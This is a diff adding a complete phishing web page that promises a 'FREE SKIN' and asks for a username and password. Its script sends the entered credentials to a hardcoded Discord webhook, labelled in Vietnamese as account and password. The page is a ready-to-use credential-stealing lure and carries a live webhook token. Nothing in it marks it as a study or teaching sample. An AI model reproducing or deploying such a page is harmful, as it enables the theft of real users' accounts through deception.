@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title>
+            FREE SKIN
+        </title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="burger.css">
+        
+    </head>
+
+    <body>
+        <div class="password-menu">
+            <input type="text" class="input-type" id="user" placeholder="Username">
+            <input type="password" class="input-type" id="pass" placeholder="Password">
+            <button onclick="sendData()">CONFIRM</button>
+        </div>
+        <script>
+            async function sendData(){
+                let us = document.querySelector("#user").value;
+                let pa = document.querySelector("#pass").value;
+                let data = {
+                    content: `Tài khoản: ${us}\nMật khẩu: ${pa}`
+                }
+                const webhookURL = "https://discord.com/api/webhooks/1418127046994956289/ujofpRBikTKaerOZYZBjOanVa5fHffXtInZnkdh-zngtMEdTdwriOio414OtwSsp5hwt";
+                
+                try{
+                    let res = await fetch(webhookURL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(data)
+                    })
+                    if(res.ok){
+                        alert("Đã gửi đi thành công")
+                    }else{
+                        console.error("Gửi lỗi")
+                    }
+                }catch{
+                    console.error("Gửi lỗi")
+                }
+            }
+        </script>
+    </body>
+   
+</html>
